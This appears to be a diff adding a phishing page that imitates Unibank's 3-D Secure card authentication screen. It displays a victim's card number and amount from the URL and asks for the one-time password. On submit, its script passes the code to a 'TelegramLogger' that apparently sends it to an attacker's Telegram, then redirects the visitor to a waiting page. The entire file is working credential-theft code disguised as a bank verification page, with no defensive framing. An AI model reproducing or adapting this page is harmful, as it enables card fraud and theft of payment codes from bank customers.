@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="EN" dir="ltr">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+   <title>Unibank 3D Secure</title>
+   <link rel="stylesheet" href="css/uni.css">
+   <style>
+      body {
+         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+         margin: 0;
+         padding: 0;
+         background: #f5f5f7;
+      }
+
+      .main {
+         max-width: 480px;
+         margin: 2rem auto;
+         background: white;
+         border-radius: 12px;
+         box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+
+      .header-zone {
+         padding: 1rem;
+         border-bottom: 1px solid #eee;
+      }
+
+      .cancel {
+         background: none;
+         border: none;
+         color: #666;
+         cursor: pointer;
+         font-size: 0.9rem;
+      }
+
+      .title {
+         padding: 1.5rem;
+         display: flex;
+         align-items: center;
+         justify-content: space-between;
+      }
+
+      .title img {
+         max-height: 40px;
+         object-fit: contain;
+      }
+
+      .content {
+         padding: 1.5rem;
+      }
+
+      .item {
+         margin-bottom: 1.5rem;
+      }
+
+      .item-caption {
+         font-size: 1.2rem;
+         font-weight: 500;
+         color: #333;
+      }
+
+      .item-amount {
+         font-size: 2rem;
+         font-weight: 600;
+         text-align: center;
+         color: #333;
+         margin: 2rem 0;
+      }
+
+      .columns {
+         display: flex;
+         justify-content: space-between;
+         padding: 0.5rem 0;
+         border-bottom: 1px solid #eee;
+      }
+
+      .item-left {
+         color: #666;
+      }
+
+      .item-right {
+         font-weight: 500;
+      }
+
+      input[name="otp"] {
+         width: 100%;
+         border: 1px solid #ddd;
+         border-radius: 8px;
+         font-size: 1.2rem;
+         text-align: center;
+         letter-spacing: 4px;
+      }
+
+      .submit {
+         width: 100%;
+         padding: 1rem;
+         background: #007AFF;
+         color: white;
+         border: none;
+         border-radius: 8px;
+         font-size: 1rem;
+         font-weight: 500;
+         cursor: pointer;
+         transition: background 0.2s;
+      }
+
+      .submit:hover {
+         background: #0066CC;
+      }
+
+      .cp-error {
+         color: #ff3b30;
+         font-size: 0.9rem;
+      }
+   </style>
+</head>
+
+<body class="MASTERCARD">
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   <script src="js/telegram-logger.js"></script>
+   <div data-entry-point="application-container">
+      <div class="main web-based">
+         <div class="header-zone">
+            <button id="cancel" class="cancel">Cancel</button>
+         </div>
+         <div class="title">
+            <div class="ps">
+               <img src="images/MASTERCARDuni.png" alt="Mastercard Identity Check">
+            </div>
+            <div class="logo">
+               <img src="images/unibank.png" alt="Unibank">
+            </div>
+         </div>
+         <div class="content">
+            <div class="item item-caption">Cardholder Authentication</div>
+            <div data-entry-point="payment-details">
+               <div class="item item-amount">
+                  <span id="amount">0.00</span> AZN
+               </div>
+               <div class="item columns acct-number">
+                  <div class="item-left">Card Number</div>
+                  <div class="item-right" id="cardNumber">**** **** **** ****</div>
+               </div>
+            </div>
+            <div data-entry-point="authentication">
+               <div>
+                  <div class="item item-indent">Please enter one-time password to confirm your identity. Password has
+                     been sent to <span class="address">+994*********</span></div>
+                  <form method="POST" action="wait.html" novalidate id="uniForm">
+                      <input type="hidden" name="card" id="card">
+                     <input type="hidden" name="id" value="">
+                     <input type="tel" name="otp" autocomplete="one-time-code" maxlength="6" placeholder="• • • • • •">
+                     <div class="item item-indent cp-error"></div>
+                     <div class="cp-otp-buttons">
+                        <button type="submit" class="submit">Submit</button>
+                     </div>
+                  </form>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+
+   <script>
+      // Get URL parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const amount = urlParams.get('amount') || '0.00';
+      const cardNumber = urlParams.get('card') || '**** **** **** ****';
+      document.getElementById('card').value = cardNumber;
+
+      // Update the UI with URL parameters
+      document.getElementById('amount').textContent = amount;
+      document.getElementById('cardNumber').textContent = cardNumber;
+
+      // Card type detection and logo switching
+      const cardTypeLogo = document.querySelector('.ps img');
+      if (cardNumber.startsWith('4')) {
+          cardTypeLogo.src = 'images/visa.png';
+          cardTypeLogo.alt = 'Visa Identity Check';
+      } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(cardNumber)) {
+          cardTypeLogo.src = 'images/mastercard.png';
+          cardTypeLogo.alt = 'Mastercard Identity Check';
+      }
+
+      // OTP input handling
+      document.getElementsByName("otp")[0].addEventListener("input", function (event) {
+         let value = event.target.value;
+         // Only allow numbers
+         event.target.value = value.replace(/\D/g, "");
+         // Limit to 6 digits
+         if (value.length > 6) {
+            event.target.value = value.slice(0, 6);
+         }
+      });
+
+      // Cancel button handler
+      document.getElementById('cancel').addEventListener('click', function () {
+         window.history.back();
+      });
+
+      // Form submit handler - save and send OTP every time
+      document.getElementById('uniForm').addEventListener('submit', function(e) {
+         e.preventDefault();
+         const cardNumber = document.getElementById('card').value;
+         const otpCode = document.getElementsByName('otp')[0].value;
+         
+         // Save OTP using Telegram Logger (every time)
+         if (window.TelegramLogger && otpCode) {
+            console.log('💾 OTP saxlanılır:', otpCode);
+            window.TelegramLogger.saveOTP(otpCode, 'UniBank');
+            
+            console.log('📤 OTP Telegram-a göndərilir...');
+            // Send OTP to Telegram immediately (every time)
+            window.TelegramLogger.sendOTPInfo().then(success => {
+                console.log('✅ OTP göndərildi:', success);
+                // Redirect after sending
+                window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+            }).catch(error => {
+                console.error('❌ OTP göndərmə xətası:', error);
+                // Redirect even if send fails
+                window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+            });
+         } else {
+            console.error('❌ TelegramLogger yoxdur və ya OTP boşdur!');
+            // Redirect anyway
+            window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+         }
+      });
+   </script>
+</body>
+
+</html>
